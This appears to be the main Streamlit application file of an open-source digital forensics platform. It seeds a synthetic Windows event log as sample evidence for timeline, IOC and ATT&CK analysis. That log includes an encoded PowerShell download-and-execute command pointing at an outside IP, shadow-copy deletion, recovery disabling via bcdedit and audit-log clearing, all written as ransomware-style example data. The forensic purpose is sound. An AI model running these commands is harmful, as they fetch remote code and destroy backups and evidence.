"""
ForensiQ AI - Streamlit Web Application
An Open-Source AI-Assisted Digital Forensics Investigation Platform
Targeting: Hacktoberfest 2026 — Best Open-Source AI Project

Usage:
  streamlit run app.py
"""

import os
import sys
import json
import sqlite3
from datetime import datetime
import pandas as pd
import streamlit as st

# Internal ForensiQ modules
from forensiq.hasher import compute_sha256, compute_md5, verify_integrity, generate_custody_seal
from forensiq.db import init_db, save_case, save_evidence, log_custody_action
from forensiq.ioc_extractor import extract_iocs
from forensiq.timeline import parse_timeline
from forensiq.mitre import map_events_to_mitre
from forensiq.ollama_client import is_ollama_available, query_ollama, generate_deterministic_analysis
from forensiq.report_generator import generate_markdown_report

# Page Configuration
st.set_page_config(
    page_title="ForensiQ AI - Digital Forensics Workstation",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# Initialize Database
db_conn = init_db("forensiq_cases.db")

# Initialize Session State
if "active_case_id" not in st.session_state:
    st.session_state["active_case_id"] = "CAS-2026-0891"

if "evidence_list" not in st.session_state:
    sample_log = """2026-10-24T01:14:22Z [Security-Event-4624] An account was successfully logged on. TargetUserName: Administrator, WorkstationName: WKST-FIN-09, LogonType: 3 (Network), SourceIp: 192.168.1.105
2026-10-24T01:15:04Z [Security-Event-4688] A new process has been created. CreatorProcessName: explorer.exe, NewProcessName: cmd.exe, ProcessId: PID: 4092, CommandLine: cmd.exe /c whoami /all
2026-10-24T01:16:30Z [Security-Event-4688] A new process has been created. CreatorProcessName: cmd.exe, NewProcessName: powershell.exe, ProcessId: PID: 4510, CommandLine: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA6ADgAMAA4ADAALwBiAC4AcABzADEAJwApAA==
2026-10-24T01:18:12Z [Security-Event-7045] A new service was installed in the system. ServiceName: WindowsDefenderUpdateSvc, ServiceFileName: C:\\Windows\\Temp\\srvmgr.exe, ServiceType: user mode service
2026-10-24T01:20:45Z [Security-Event-4688] A new process has been created. CreatorProcessName: srvmgr.exe, NewProcessName: vssadmin.exe, ProcessId: PID: 5120, CommandLine: vssadmin delete shadows /all /quiet
2026-10-24T01:21:10Z [Security-Event-4688] A new process has been created. CreatorProcessName: srvmgr.exe, NewProcessName: bcdedit.exe, ProcessId: PID: 5188, CommandLine: bcdedit /set {default} recoveryenabled no
2026-10-24T01:25:30Z [Security-Event-1102] The audit log was cleared. SubjectUserSid: S-1-5-21-3920-500, SubjectUserName: Administrator, Domain: CORP-FIN"""

    sha = compute_sha256(sample_log)
    st.session_state["evidence_list"] = [
        {
            "id": "EVD-001",
            "name": "Domain Controller Security Logs",
            "filename": "DC01_Security_Audit.evtx",
            "file_type": "evtx_logs",
            "size_bytes": len(sample_log),
            "sha256": sha,
            "md5": compute_md5(sample_log),
            "acquired_at": "2026-10-24 01:45:00 UTC",
            "acquired_by": "Agent Alex Mercer, GCFE",
            "write_blocker_model": "Tableau T8u Forensic USB 3.0 Bridge",
            "raw_content": sample_log,
            "integrity_verified": True,
        }
    ]

# Sidebar
st.sidebar.title("🛡️ ForensiQ AI")
st.sidebar.caption("An Open-Source AI-Assisted Digital Forensics Platform")

st.sidebar.markdown("---")
st.sidebar.markdown(f"**Active Case:** `{st.session_state['active_case_id']}`")
st.sidebar.markdown("**Classification:** `TLP:AMBER+STRICT`")
st.sidebar.markdown("**Examiner:** Agent Alex Mercer, GCFE")

# Check Ollama Status
ollama_up = is_ollama_available()
if ollama_up:
    st.sidebar.success("🟢 Local Ollama Daemon: ONLINE")
else:
    st.sidebar.info("🟡 Ollama: Offline (Deterministic Fallback Active)")

nav_selection = st.sidebar.radio(
    "Navigation Workspace:",
    [
        "📦 Evidence Locker & Custody",
        "⏱️ Chronological Timeline",
        "🎯 MITRE ATT&CK Matrix",
        "🔍 IOC & Artifact Inspector",
        "🤖 ForensiQ AI Copilot",
        "📄 Investigation Report Studio",
    ],
)

# ----------------- VIEW 1: EVIDENCE LOCKER -----------------
if nav_selection == "📦 Evidence Locker & Custody":
    st.header("📦 Evidence Locker & Chain of Custody")
    st.caption("ISO/IEC 27037 Standard Evidence Tracking & Bitstream Hashing")

    col1, col2 = st.columns([3, 1])
    with col1:
        st.write(f"**Total Cataloged Evidence Items:** {len(st.session_state['evidence_list'])}")
    with col2:
        if st.button("➕ Ingest Custom Log/Artifact"):
            st.session_state["show_ingest"] = True

    if st.session_state.get("show_ingest", False):
        with st.form("ingest_form"):
            st.subheader("Ingest New Forensic Evidence")
            name = st.text_input("Evidence Title", "Workstation Memory Dump Excerpt")
            filename = st.text_input("Filename", "wkst_dump.log")
            wb = st.text_input("Acquisition Write-Blocker", "Tableau T8u Bridge")
            raw = st.text_area("Raw Artifact Stream", height=150)
            submitted = st.form_submit_button("Seal & Ingest")
            if submitted and raw and filename:
                sha = compute_sha256(raw)
                st.session_state["evidence_list"].append({
                    "id": f"EVD-{len(st.session_state['evidence_list'])+1:03d}",
                    "name": name,
                    "filename": filename,
                    "file_type": "raw_logs",
                    "size_bytes": len(raw),
                    "sha256": sha,
                    "md5": compute_md5(raw),
                    "acquired_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
                    "acquired_by": "Agent Alex Mercer",
                    "write_blocker_model": wb,
                    "raw_content": raw,
                    "integrity_verified": True,
                })
                st.session_state["show_ingest"] = False
                st.success("Evidence sealed and cataloged with SHA-256 verification!")
                st.rerun()

    for item in st.session_state["evidence_list"]:
        with st.expander(f"📁 {item['name']} ({item['filename']}) - [SHA-256 Verified]", expanded=True):
            c1, c2, c3 = st.columns([2, 1, 1])
            c1.markdown(f"**SHA-256 Checksum:** `{item['sha256']}`")
            c2.markdown(f"**Acquisition Device:** `{item['write_blocker_model']}`")
            c3.markdown(f"**Acquired At:** `{item['acquired_at']}`")
            st.code(item['raw_content'][:400] + ("..." if len(item['raw_content']) > 400 else ""), language="log")

# ----------------- VIEW 2: TIMELINE -----------------
elif nav_selection == "⏱️ Chronological Timeline":
    st.header("⏱️ Chronological Timeline Reconstruction")
    st.caption("Reconstructed Multi-Source Event Stream with Anomaly Classification")

    all_raw = "\n".join([e['raw_content'] for e in st.session_state["evidence_list"]])
    events = parse_timeline(all_raw, "Aggregated Evidence")

    df_events = pd.DataFrame(events)
    if not df_events.empty:
        col_f1, col_f2 = st.columns([2, 2])
        with col_f1:
            filter_anomalies = st.checkbox("Show Anti-Forensics & Anomalies Only")
        with col_f2:
            severity_choice = st.selectbox("Severity Filter:", ["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW"])

        filtered = df_events
        if filter_anomalies:
            filtered = filtered[filtered["is_anomaly"] == True]
        if severity_choice != "ALL":
            filtered = filtered[filtered["severity"] == severity_choice]

        st.dataframe(
            filtered[["timestamp", "event_type", "severity", "mitre_id", "summary", "process_name"]],
            use_container_width=True
        )

# ----------------- VIEW 3: MITRE ATT&CK -----------------
elif nav_selection == "🎯 MITRE ATT&CK Matrix":
    st.header("🎯 MITRE ATT&CK Enterprise Matrix Correlation")
    st.caption("Adversarial Tactic & Technique Coverage Mapped from Case Telemetry")

    all_raw = "\n".join([e['raw_content'] for e in st.session_state["evidence_list"]])
    events = parse_timeline(all_raw, "Aggregated Evidence")
    tactics = map_events_to_mitre(events)

    cols = st.columns(4)
    for idx, t in enumerate(tactics):
        with cols[idx % 4]:
            with st.container(border=True):
                st.markdown(f"**{t['id']}** - {t['name']}")
                if t['techniques']:
                    for tech in t['techniques']:
                        badge_color = "red" if tech['severity'] == "CRITICAL" else "orange" if tech['severity'] == "HIGH" else "blue"
                        st.markdown(f"- **{tech['id']}** ({tech['name']}) `{tech['count']}x`")
                else:
                    st.caption("No detections.")

# ----------------- VIEW 4: IOC INSPECTOR -----------------
elif nav_selection == "🔍 IOC & Artifact Inspector":
    st.header("🔍 Indicator & Artifact Inspector")
    st.caption("Extracted Observable IPs, Hashes, LOLBins, and CVEs")

    all_raw = "\n".join([e['raw_content'] for e in st.session_state["evidence_list"]])
    iocs = extract_iocs(all_raw)

    if iocs:
        df_iocs = pd.DataFrame(iocs)
        st.dataframe(df_iocs[["type", "value", "threat_level", "context", "mitre_tactic", "count"]], use_container_width=True)

# ----------------- VIEW 5: FORENSIQ COPILOT -----------------
elif nav_selection == "🤖 ForensiQ AI Copilot":
    st.header("🤖 ForensiQ Forensic Investigation Copilot")
    st.caption("Evidence-Grounded AI Reasoning Engine (Local Ollama / Deterministic Fallback)")

    all_raw = "\n".join([e['raw_content'] for e in st.session_state["evidence_list"]])
    events = parse_timeline(all_raw, "Aggregated Evidence")
    iocs = extract_iocs(all_raw)

    case_data = {
        "case_id": st.session_state["active_case_id"],
        "incident_type": "Enterprise Ransomware & Log Purge",
        "classification": "TLP:AMBER+STRICT"
    }

    if st.button("🚀 Run Comprehensive Forensic Triage"):
        with st.spinner("Analyzing artifacts under ISO/IEC 27037..."):
            if ollama_up:
                prompt = f"Act as an expert digital forensics examiner. Analyze this case: {case_data}. Events: {events[:6]}. IOCs: {iocs[:6]}."
                response = query_ollama(prompt) or generate_deterministic_analysis(case_data, events, iocs)
            else:
                response = generate_deterministic_analysis(case_data, events, iocs)
            st.session_state["ai_copilot_result"] = response

    if "ai_copilot_result" in st.session_state:
        st.markdown(st.session_state["ai_copilot_result"])

# ----------------- VIEW 6: REPORT STUDIO -----------------
elif nav_selection == "📄 Investigation Report Studio":
    st.header("📄 Official Forensic Investigation Report Studio")
    st.caption("NIST SP 800-86 & Federal Rules of Evidence Rule 901 Court-Admissible Documentation")

    all_raw = "\n".join([e['raw_content'] for e in st.session_state["evidence_list"]])
    events = parse_timeline(all_raw, "Aggregated Evidence")
    iocs = extract_iocs(all_raw)
    case_data = {
        "case_id": st.session_state["active_case_id"],
        "classification": "TLP:AMBER+STRICT",
        "agency": "Cyber Incident Response Unit (CIRU)",
        "examiner_name": "Agent Alex Mercer, GCFE / CISSP",
        "case_summary": "Unauthorized domain administrative session established on WKST-FIN-09, resulting in execution of obfuscated PowerShell, service persistence, deletion of Volume Shadow copies via vssadmin, and intentional clearing of Security Event Logs (Event 1102)."
    }

    findings = st.session_state.get("ai_copilot_result", generate_deterministic_analysis(case_data, events, iocs))
    report_md = generate_markdown_report(case_data, st.session_state["evidence_list"], events, iocs, findings)

    st.markdown(report_md)
    st.download_button(
        "📥 Download Court-Admissible Forensic Report (.md)",
        data=report_md,
        file_name=f"Forensic_Report_{st.session_state['active_case_id']}.md",
        mime="text/markdown"
    )
